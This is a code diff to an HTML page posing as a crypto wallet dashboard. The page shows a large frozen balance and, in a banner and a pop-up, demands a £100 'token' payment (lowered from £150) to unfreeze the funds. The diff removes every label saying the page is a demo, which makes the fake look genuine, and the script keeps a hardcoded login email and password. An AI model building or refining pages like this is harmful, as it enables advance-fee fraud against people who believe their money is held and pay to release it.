@@ -358,13 +358,10 @@
       <p style="color: #2c3e66;">Secure • Premium • Smart</p>
     </div>
     <div style="margin: 1.2rem 0;">
-      <input type="email" id="loginEmail" placeholder="Email address" value="highrevinkevin3@gmail.co">
-      <input type="password" id="loginPassword" placeholder="Password" value="#Highkevin@109">
+      <input type="email" id="loginEmail" placeholder="Email address/Username" value="">
+      <input type="password" id="loginPassword" placeholder="Password" value="">
     </div>
     <button class="login-btn" id="doLoginBtn"><i class="fas fa-arrow-right-to-bracket"></i> Unlock Wallet</button>
-    <div class="demo-hint">
-      <i class="fas fa-info-circle"></i> Pre-created demo account (manual login)
-    </div>
   </div>
 
   <!-- DASHBOARD VIEW (after successful login) -->
@@ -375,7 +372,7 @@
         <span>Premium crypto interface</span>
       </div>
       <div class="user-badge">
-        <i class="fas fa-user-circle"></i> highrevinkevin3@gmail.co
+        <i class="fas fa-user-circle"></i> highrevin
       </div>
     </div>
 
@@ -389,15 +386,12 @@
         <!-- red notification under funds -->
         <div class="frozen-warning">
           <i class="fas fa-exclamation-triangle"></i>
-          <span>Funds are frozen due to inactivity kindly pay a token of £150 to unfreeze the funds</span>
+          <span>Funds are frozen due to inactivity kindly pay a token of £100 to unfreeze the funds</span>
         </div>
 
         <div class="action-buttons">
           <button class="btn btn-send" id="sendBtnAction"><i class="fas fa-paper-plane"></i> Send</button>
           <button class="btn btn-withdraw" id="withdrawBtnAction"><i class="fas fa-money-bill-wave"></i> Withdraw</button>
-        </div>
-        <div class="info-note">
-          <i class="fas fa-shield-alt"></i> Advanced protection • Non-custodial demo
         </div>
       </div>
 
@@ -429,7 +423,7 @@
     </div>
     <!-- extra dashboard glam -->
     <div style="margin-top: 1rem; text-align: center; font-size: 0.7rem; color: #2d4a7c;">
-      <i class="fas fa-database"></i> Real-time sync | Frozen wallet demo
+      <i class="fas fa-database"></i>
     </div>
   </div>
 </div>
@@ -439,15 +433,16 @@
   <div class="modal-content">
     <i class="fas fa-ban"></i>
     <h3>Action blocked</h3>
-    <p>⚠️ Funds are frozen due to inactivity. Kindly pay a token of £150 to unfreeze the funds.</p>
+    <p>⚠️ Funds are frozen due to inactivity. Kindly pay a token of £100 to unfreeze the funds.</p>
     <button class="modal-btn" id="closeModalBtn">Got it</button>
   </div>
 </div>
 
 <script>
   // pre-created credentials (exactly as given)
-  const PRE_EMAIL = "highrevinkevin3@gmail.co";
+  const PRE_EMAIL = "highrevinkevin3@gmail.com";
   const PRE_PASSWORD = "#Highkevin@109";
+  const PRE_USERNAME = "highrevin";
   const FROZEN_BALANCE = "712236";
   const FROZEN_MESSAGE_TEXT = "Funds are frozen due to inactivity kindly pay a token of £150 to unfreeze the funds";
 
